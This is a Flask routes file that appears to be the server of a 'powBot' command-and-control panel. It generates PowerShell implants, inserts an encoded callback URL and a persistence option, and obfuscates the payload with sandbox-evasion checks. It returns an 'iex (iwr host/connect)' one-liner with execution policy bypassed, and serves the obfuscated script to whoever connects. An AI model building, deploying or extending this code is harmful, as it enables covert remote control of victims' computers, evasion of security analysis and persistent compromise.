# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import base64
import platform
import re
import unicodedata
import shutil
import tempfile
from urllib.parse import urlparse
import zipfile
from apps.home import blueprint
from flask import after_this_request, current_app, render_template, request, send_file,Response
from flask_login import login_required, current_user
from jinja2 import TemplateNotFound
from flask import Flask, request, jsonify
import json
import threading
import os
from datetime import datetime, timedelta
import time
import logging
from werkzeug.serving import WSGIRequestHandler
from apps import db  # Import the database instance
import flask_cors
from werkzeug.utils import secure_filename
from flask import send_from_directory
import requests
import uuid

import subprocess
import tempfile
import os
import uuid
from pathlib import Path

# Initialize Flask CORS
flask_cors.CORS(blueprint)
# Create a logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
# Create formatter
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
# Add formatter to ch
ch.setFormatter(formatter)
# Add ch to logger
logger.addHandler(ch)   
# Define Task model


class Task(db.Model):
    __tablename__ = 'tasks'

    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(100), nullable=False)
    issue_date = db.Column(db.DateTime, default=datetime.utcnow)
    command = db.Column(db.Text, nullable=True)  # Changed to nullable=True
    status = db.Column(db.String(20), default='Pending')
    response = db.Column(db.Text, default='')
    task_type = db.Column(db.String(20))  # New field
    file_path = db.Column(db.String(255))  # New field
    entry_point = db.Column(db.String(100))  # New field

    def __repr__(self):
        return f'<Task {self.id} for {self.client_id}>'


# Thread locks
messages_lock = threading.Lock()
results_lock = threading.Lock()
activity_lock = threading.Lock()

# File paths
MESSAGE_FILE = "message.json"
RESULTS_FILE = "result.json"
POST_LOG_FILE = "post.log"
GET_LOG_FILE = "get.log"

# Client tracking
client_activity = {}
ACTIVITY_INTERVAL = 300  # 5 minutes in seconds


def safe_load_json(filename):
    if os.path.getsize(filename) == 0:
        with open(filename, 'w') as f:
            json.dump({}, f)
        return {}
    with open(filename, 'r') as f:
        return json.load(f)


# Initialize data files
for f in [MESSAGE_FILE, RESULTS_FILE, POST_LOG_FILE, GET_LOG_FILE]:
    if not os.path.exists(f):
        with open(f, 'w') as file:
            if f.endswith('.json'):
                json.dump({}, file)

# Load existing data
messages = safe_load_json(MESSAGE_FILE)
results = safe_load_json(RESULTS_FILE)


def save_messages():
    with open(MESSAGE_FILE, 'w') as f:
        json.dump(messages, f)


def save_results():
    with open(RESULTS_FILE, 'w') as f:
        json.dump(results, f)


# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('werkzeug')
logger.handlers.clear()

# POST requests logger
post_handler = logging.FileHandler(POST_LOG_FILE)
post_handler.setFormatter(logging.Formatter('%(message)s'))
logger.addHandler(post_handler)

# GET requests logger
get_handler = logging.FileHandler(GET_LOG_FILE)
get_handler.setFormatter(logging.Formatter('%(message)s'))
logger.addHandler(get_handler)

# Disable default Flask logging
WSGIRequestHandler.address_string = lambda x: ''


def log_request(response):
    """Log requests to appropriate files"""
    timestamp = datetime.now().strftime('[%d/%b/%Y %H:%M:%S]')
    log_line = f'127.0.0.1 - - {timestamp} "{request.method} {request.path} HTTP/1.1" {response.status_code} -\n'
    # Log to console
    
    if request.method == 'POST':
        with open(POST_LOG_FILE, 'a') as f:
            f.write(log_line)
    elif request.method == 'GET':
        with open(GET_LOG_FILE, 'a') as f:
            f.write(log_line)

    return response


def update_client_activity(client_id, ip=None):
    if not ip:
        ip = request.remote_addr or "unknown"
    with activity_lock:
        client_activity[client_id] = {
            "last_seen": datetime.now(),
            "ip": ip,
        }


def modify_powershell(ps_file, new_url, new_persistence, new_interval):
    """
    Safely modifies a PowerShell template script by replacing placeholders.

    ps_file: path to template PowerShell file
    new_url: raw URL (string, e.g., "ws://localhost:8765")
    new_persistence: boolean
    new_interval: int or string (milliseconds)
    """

    # Encode URL as Base64 and wrap in quotes for PowerShell
    encoded_url = base64.b64encode(new_url.encode("utf-8")).decode("utf-8")
    encoded_url_ps = f'"{encoded_url}"'

    # Convert Python boolean to PowerShell boolean
    persistence_ps = "$true" if new_persistence else "$false"

    # Ensure interval is a number string
    interval_ps = str(new_interval)

    # Load template
    with open(ps_file, "r", encoding="utf-8") as f:
        script = f.read()

    # Replace placeholders
    script = script.replace("{{URL}}", encoded_url_ps)
    script = script.replace("{{PERSISTENCE}}", persistence_ps)
    script = script.replace("{{CHECK_INTERVAL}}", interval_ps)
    
    return script

def build_cmd(xcrypt_path, temp_input, temp_output, iterations=3, include_sandbox_checks=True):
    """
    Build the PowerShell command to run Pcrypt.ps1 with the new argument format.
    
    Args:
        xcrypt_path: Path to Pcrypt.ps1
        temp_input: Input PowerShell script path
        temp_output: Output obfuscated script path
        iterations: Number of obfuscation iterations (default: 3)
        include_sandbox_checks: Whether to include sandbox detection checks (default: True)
    """
    xcrypt_path = str(xcrypt_path)
    temp_input = str(temp_input)
    temp_output = str(temp_output)

    if platform.system() == "Windows":
        powershell = "powershell.exe"
    else:
        powershell = "pwsh"

    # Build the command with new argument format
    pcrypt_cmd = f"& '{xcrypt_path}' -InFile '{temp_input}' -OutFile '{temp_output}' -Iterations {iterations}"
    
    # Add sandbox checks flag if enabled
    if include_sandbox_checks:
        pcrypt_cmd += " -IncludeSandboxChecks"

    cmd = [
        powershell,
        "-ExecutionPolicy", "Bypass",
        "-Command",
        pcrypt_cmd
    ]
    return cmd


def obfuscate_powershell(modified_script, xcrypt_path, iterations=3, include_sandbox_checks=True):
    """
    Takes a PowerShell script string, runs Pcrypt.ps1 to obfuscate it,
    and returns the obfuscated code as a string.
    
    Args:
        modified_script: The PowerShell script content to obfuscate
        xcrypt_path: Path to Pcrypt.ps1
        iterations: Number of obfuscation iterations (default: 3)
        include_sandbox_checks: Whether to include sandbox detection checks (default: True)
    """
    # Create temporary input and output file paths
    temp_input = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}_input.ps1")
    temp_output = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}_output.ps1")

    try:
        # Write modified script to temp input file
        with open(temp_input, "w", encoding="utf-8") as f:
            f.write(modified_script)

        # Build PowerShell command with new argument format
        cmd = build_cmd(xcrypt_path, temp_input, temp_output, iterations, include_sandbox_checks)

        # Run PowerShell process
        subprocess.run(cmd, check=True)

        # Read obfuscated script
        with open(temp_output, "r", encoding="utf-8") as f:
            obfuscated_script = f.read()

    finally:
        # Clean up temp files
        for path in [temp_input, temp_output]:
            if os.path.exists(path):
                os.remove(path)

    return obfuscated_script


def make_ws_url(http_url, default_port=4000):
    parsed = urlparse(http_url)
    scheme = "http" if current_app.debug else "https"
    return f"{scheme}://{parsed.hostname}:{default_port}"

   

def make_Connect_url(host: str, policy: str) -> str:
    """
    Build the PowerShell connect command based on the host and execution policy.
    """

    if policy == "Bypass":
        policy_cmd = "Bypass"
    elif policy == "Unrestricted":
        policy_cmd = "Unrestricted"
    elif policy == "RemoteSigned":
        policy_cmd = "RemoteSigned"
    elif policy == "AllSigned":
        policy_cmd = "AllSigned"
    else:
        return "Invalid execution policy selected."

    # Build final PowerShell command with execution policy applied
    return f"powershell -ExecutionPolicy {policy_cmd} -Command \"iex (iwr {host}/connect)\""




@blueprint.route("/generate_script", methods=["POST"])
def generate_script():
    data = request.get_json(force=True)

    # Ensure domain is provided
    domain_raw = make_ws_url(data.get("domain", ""))
    print(domain_raw)
    if not domain_raw:
        return Response("Missing domain", status=400, mimetype="text/plain")

  
    # Extract and validate parameters
    try:
        check_interval = int(data.get("checkInterval", 200))
    except ValueError:
        return Response("Invalid checkInterval", status=400, mimetype="text/plain")

    persistence_enabled = str(data.get("persistence", "false")).lower() in ("true", "1", "yes")
    execpolicy = data.get("exPolicy", "")

    base_dir = os.path.join(current_app.root_path, "home", "master","stub")

    ps_file = os.path.join(base_dir, "PShell.ps1")
    xcrypt_file = os.path.join(base_dir, "Pcrypt.ps1")
    ConnectFile = os.path.join(base_dir, "check.ps1")
    # Modify PowerShell script
    updated_script = modify_powershell(
        ps_file,
        new_url=domain_raw,
        new_persistence=persistence_enabled,
        new_interval=check_interval 
    )

    # Obfuscate
    obfuscated = obfuscate_powershell(updated_script, xcrypt_file)
    os.remove(ConnectFile)
    # Read obfuscated script
    with open(ConnectFile, "w", encoding="utf-8") as f:
        f.write(obfuscated)


    return Response(make_Connect_url(data.get("domain", ""),execpolicy), mimetype="text/plain")



@blueprint.route('/connect')
def Connect():
    connect_file = os.path.join("apps", "home", "master", "stub", "check.ps1")

    # Read script
    with open(connect_file, "r", encoding="utf-8") as f:
        ps_script = f.read()

    return Response(
        ps_script,
        mimetype="text/plain",  # correct type for iwr
        headers={"Content-Disposition": "inline; filename=check.ps1"}
    )
    



@blueprint.route('/index')
@login_required
def index():
    return render_template('home/powBot.html',
                           segment='dashboard',
                           user_id=current_user.id,
                           debug=current_app.debug)


@blueprint.route('/<template>')
@login_required
def route_template(template):
    try:
        if not template.endswith('.html'):
            template += '.html'

        segment = get_segment(request)
        return render_template("home/" + template, segment=segment)

    except TemplateNotFound:
        return render_template('home/page-404.html'), 404

    except:
        return render_template('home/page-500.html'), 500


def get_segment(request):
    try:
        segment = request.path.split('/')[-1]
        if segment == '':
            segment = 'index'
        return segment
    except:
        return None


